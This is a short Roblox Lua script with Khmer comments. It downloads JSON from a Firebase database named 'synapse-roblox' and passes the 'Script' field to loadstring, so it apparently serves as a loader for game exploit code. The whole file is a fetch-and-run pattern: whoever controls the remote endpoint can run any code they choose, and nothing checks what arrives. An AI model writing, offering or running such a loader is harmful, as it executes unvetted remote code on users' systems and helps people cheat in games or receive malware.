local Http = game:GetService("HttpService")

-- ទាញ JSON data ពី Firebase
local data = game:HttpGet("https://synapse-roblox-default-rtdb.firebaseio.com/endpoint/scriptPath.json")
local parsed = Http:JSONDecode(data)

-- រត់ Script តាមពិត
loadstring(parsed.Script)()
